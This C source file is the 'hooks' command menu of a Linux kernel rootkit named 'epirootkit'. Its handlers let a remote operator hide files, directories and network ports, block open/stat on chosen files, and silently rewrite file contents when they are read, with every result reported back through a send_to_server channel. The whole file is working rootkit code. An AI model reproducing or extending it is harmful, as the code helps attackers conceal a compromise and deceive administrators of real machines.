#include "menu.h"

#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "alterate_api.h"
#include "epirootkit.h"
#include "forbid_api.h"
#include "hide_api.h"

static int hide_dir_handler(char *args, enum Protocol protocol);
static int unhide_dir_handler(char *args, enum Protocol protocol);
static int forbid_file_handler(char *args, enum Protocol protocol);
static int unforbid_file_handler(char *args, enum Protocol protocol);
static int list_hidden_handler(char *args, enum Protocol protocol);
static int list_forbidden_handler(char *args, enum Protocol protocol);
static int list_alterate_handler(char *args, enum Protocol protocol);
static int unmodify_file_handler(char *args, enum Protocol protocol);
static int modify_file_handler(char *args, enum Protocol protocol);
static int hide_port_handler(char *args, enum Protocol protocol);
static int unhide_port_handler(char *args, enum Protocol protocol);
static int list_hidden_port_handler(char *args, enum Protocol protocol);
static int hooks_help(char *args, enum Protocol protocol);

// hooks menu commands, must start with 'hooks' to be recognized
static struct command hooks_commands[] = {
    { "hide", 4, "hide a file or directory (getdents64 hook)", 43,
      hide_dir_handler },
    { "unhide", 6, "unhide a file or directory", 32, unhide_dir_handler },
    { "list_hide", 9, "list hidden files/directories", 34, list_hidden_handler },

    { "add_port", 8, "add port to hide", 16, hide_port_handler },
    { "remove_port", 11, "remove hidden port", 18, unhide_port_handler },
    { "list_port", 9, "list hidden ports", 17, list_hidden_port_handler },

    { "forbid", 6, "forbid open/stat on a file (openat/stat/lstat... hook)", 55,
      forbid_file_handler },
    { "unforbid", 8, "remove forbid on a file", 30, unforbid_file_handler },
    { "list_forbid", 11, "list forbidden files", 30, list_forbidden_handler },

    { "modify", 6,
      "[CAREFUL] modify a file with hide/replace operation (read hook)", 64,
      modify_file_handler },
    { "unmodify", 8, "unmodify a file", 30, unmodify_file_handler },
    { "list_modify", 11, "list alterate rules", 30, list_alterate_handler },

    { "help", 4, "display hooks help menu", 25, hooks_help },
    { NULL, 0, NULL, 0, NULL }
};

static int hooks_help(char *args, enum Protocol protocol) {
    int i;
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int off = snprintf(buf, STD_BUFFER_SIZE, "Available hooks commands:\n");
    for (i = 0; hooks_commands[i].cmd_name != NULL; i++) {
        off += snprintf(buf + off, STD_BUFFER_SIZE - off, "  %-12s - %s\n",
                        hooks_commands[i].cmd_name, hooks_commands[i].cmd_desc);
        if (off >= STD_BUFFER_SIZE)
            break;
    }
    send_to_server(protocol, "%s", buf);
    kfree(buf);
    return 0;
}

static int hide_port_handler(char *args, enum Protocol protocol) {
    if (!args)
        return -EINVAL;
    int r = hide_port(args);
    if (r == SUCCESS)
        send_to_server(protocol, "Hidden: %s\n", args);
    else
        send_to_server(protocol, "Error hiding %s: %d\n", args, r);
    return r;
};

static int unhide_port_handler(char *args, enum Protocol protocol) {
    if (!args)
        return -EINVAL;
    int r = unhide_port(args);
    if (r == SUCCESS)
        send_to_server(protocol, "Unhidden: %s\n", args);
    else
        send_to_server(protocol, "Error unhiding %s: %d\n", args, r);
    return r;
};

static int list_hidden_port_handler(char *args, enum Protocol protocol) {
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int len = port_list_get(buf, STD_BUFFER_SIZE);
    if (len <= 0)
        send_to_server(protocol, "No hidden entries");
    else
        send_to_server(protocol, "%s", buf);
    kfree(buf);
    return len;
};

static int hide_dir_handler(char *args, enum Protocol protocol) {
    if (!args)
        return -EINVAL;
    int r = hide_file(args);
    if (r == SUCCESS)
        send_to_server(protocol, "Hidden: %s\n", args);
    else
        send_to_server(protocol, "Error hiding %s: %d\n", args, r);
    return r;
}

static int unhide_dir_handler(char *args, enum Protocol protocol) {
    if (!args)
        return -EINVAL;
    int r = unhide_file(args);
    if (r == SUCCESS)
        send_to_server(protocol, "Unhidden: %s\n", args);
    else
        send_to_server(protocol, "Error unhide %s: %d\n", args, r);
    return r;
}

static int forbid_file_handler(char *args, enum Protocol protocol) {
    if (!args)
        return -EINVAL;
    int r = forbid_file(args);
    if (r == SUCCESS)
        send_to_server(protocol, "Forbidden: %s\n", args);
    else
        send_to_server(protocol, "Error forbidding %s: %d\n", args, r);
    return r;
}

static int unforbid_file_handler(char *args, enum Protocol protocol) {
    if (!args)
        return -EINVAL;
    int r = unforbid_file(args);
    if (r == SUCCESS)
        send_to_server(protocol, "Unforbidden: %s\n", args);
    else
        send_to_server(protocol, "Error unforbid %s: %d\n", args, r);
    return r;
}

static int list_hidden_handler(char *args, enum Protocol protocol) {
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int len = hide_list_get(buf, STD_BUFFER_SIZE);
    if (len <= 0)
        send_to_server(protocol, "No hidden entries\n");
    else
        send_to_server(protocol, "%s", buf);
    kfree(buf);
    return 0;
}

static int list_forbidden_handler(char *args, enum Protocol protocol) {
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int len = forbid_list_get(buf, STD_BUFFER_SIZE);
    if (len <= 0)
        send_to_server(protocol, "No forbidden entries\n");
    else
        send_to_server(protocol, "%s", buf);
    kfree(buf);
    return 0;
}

static int list_alterate_handler(char *args, enum Protocol protocol) {
    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int len = alterate_list_get(buf, STD_BUFFER_SIZE);
    if (len <= 0)
        send_to_server(protocol, "No alterate rules, sorry.\n");
    else
        send_to_server(protocol, "%s", buf);
    kfree(buf);
    return 0;
}

static int modify_file_handler(char *args, enum Protocol protocol) {
    char *path;
    int ret = 0;
    long hide_line = -1;
    char *hide_substr = NULL;
    char *replace_src = NULL;
    char *replace_dst = NULL;

    // Parsing
    char *token;

    // Get the first token
    path = strsep(&args, " ");
    if (!path || path[0] != '/') {
        send_to_server(protocol, "Usage: hooks modify /full/path [hide_line=N] "
                                 "[hide_substr=TXT] [replace=SRC:DST]\n");
        return -EINVAL;
    }

    while (args && *args) {
        token = strsep(&args, " ");
        if (!token || *token == '\0')
            continue;

        if (strncmp(token, "hide_line=", 10) == 0) {
            char *num = token + 10;

            if (*num != '\0')
                hide_line = simple_strtol(num, NULL, 10);
        }

        else if (strncmp(token, "hide_substr=", 12) == 0) {
            char *txt = token + 12;
            if (*txt == '\0') {
                send_to_server(protocol, "Usage: hide_substr=TXT (TXT empty)\n");
                ret = -EINVAL;
                goto cleanup;
            }
            hide_substr = kstrdup(txt, GFP_KERNEL);
            if (!hide_substr) {
                ret = -ENOMEM;
                goto cleanup;
            }
        }

        else if (strncmp(token, "replace=", 8) == 0) {
            char *arg = token + 8;
            char *colon = strchr(arg, ':');

            if (!colon || colon == arg || *(colon + 1) == '\0') {
                send_to_server(
                    protocol,
                    "Usage: replace=SRC:DST (SRC and/or DST empty, without spaces)\n");
                ret = -EINVAL;
                goto cleanup;
            }

            *colon = '\0';
            colon++;

            replace_src = kstrdup(arg, GFP_KERNEL);
            if (!replace_src) {
                ret = -ENOMEM;
                goto cleanup;
            }

            replace_dst = kstrdup(colon, GFP_KERNEL);
            if (!replace_dst) {
                ret = -ENOMEM;
                goto cleanup;
            }
        }
        else {
            send_to_server(protocol, "Usage: hooks modify /full/path [hide_line=N] "
                                     "[hide_substr=TXT] [replace=SRC:DST]\n");
            ret = -EINVAL;
            goto cleanup;
        }
    }

    // DEBUG
    DBG_MSG("modify_file_handler: path='%s', hide_line=%ld, hide_substr='%s', "
            "replace_src='%s', replace_dst='%s'\n",
            path, hide_line, hide_substr ? hide_substr : "NULL",
            replace_src ? replace_src : "NULL",
            replace_dst ? replace_dst : "NULL");

    ret = alterate_add(path, hide_line, hide_substr, replace_src, replace_dst);
    if (ret >= 0)
        send_to_server(protocol, "Modified successfully: %s\n", path);
    else
        send_to_server(protocol, "Error modifying %s\n", path);

cleanup:
    kfree(hide_substr);
    kfree(replace_src);
    kfree(replace_dst);
    return ret >= 0 ? 0 : ret;
}

static int unmodify_file_handler(char *args, enum Protocol protocol) {
    if (!args)
        return -EINVAL;
    int r = alterate_remove(args);
    if (r == SUCCESS)
        send_to_server(protocol, "Removed: %s\n", args);
    else
        send_to_server(protocol, "Error while removing %s: %d\n", args, r);
    return r;
}

// Dispatcher function
int hooks_menu_handler(char *args, enum Protocol protocol) {
    char *cmd = strsep(&args, " \t");

    int i;
    if (!cmd)
        return hooks_help(NULL, protocol);

    for (i = 0; hooks_commands[i].cmd_name != NULL; i++) {
        if (strncmp(cmd, hooks_commands[i].cmd_name,
                    hooks_commands[i].cmd_name_size)
            == 0) {
            if (hooks_commands[i].cmd_handler)
                return hooks_commands[i].cmd_handler(args, protocol);
        }
    }

    send_to_server(protocol, "Unknown hooks cmd '%s', try 'hooks help'\n", cmd);
    return -EINVAL;
}